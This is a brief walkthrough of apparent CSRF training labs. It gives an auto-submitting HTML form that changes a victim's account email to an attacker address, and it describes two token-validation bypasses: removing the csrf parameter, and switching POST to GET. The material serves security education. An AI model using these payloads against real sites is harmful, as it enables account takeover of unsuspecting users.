# 📝 CSRF Lab Walkthroughs & Exploitation Scenarios

Step-by-step solutions for CSRF vulnerabilities and token validation bypasses.

---

### Scenario 1: Basic CSRF Vulnerability (No Anti-CSRF Tokens)
* **Vulnerability**: Email change form does not require anti-CSRF token or password confirmation.
* **Exploit**: Host auto-submitting HTML form on Exploit Server:
  ```html
  <form action="https://target-app.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.com" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
  ```

---

### Scenario 2: Validation of CSRF Token Depends on Token Being Present
* **Vulnerability**: Application checks CSRF token validity *only if* the `csrf` parameter is present in the request.
* **Bypass**: Completely remove the `csrf` parameter from POST payload.

---

### Scenario 3: Validation of CSRF Token Depends on Request Method
* **Vulnerability**: Application validates CSRF token for `POST` requests, but ignores validation if converted to `GET`.
* **Bypass**: Convert `POST /change-email` to `GET /change-email?email=attacker@evil.com`.
